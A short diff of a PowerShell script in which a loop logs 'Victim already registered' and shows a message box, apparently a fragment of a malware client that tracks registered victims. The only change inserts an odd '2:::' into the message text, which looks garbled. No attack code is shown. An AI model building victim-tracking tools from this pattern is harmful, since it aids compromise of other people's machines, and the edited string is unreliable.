@@ -159,7 +159,7 @@ while ($true) {
         }
         else {
             Log-Message "[$(Get-Date)] Victim already registered."
-            [System.Windows.MessageBox]::Show("User already registered.")
+            [System.Windows.MessageBox]::Show("User already 2::: registered.")
         }
     }
     catch {
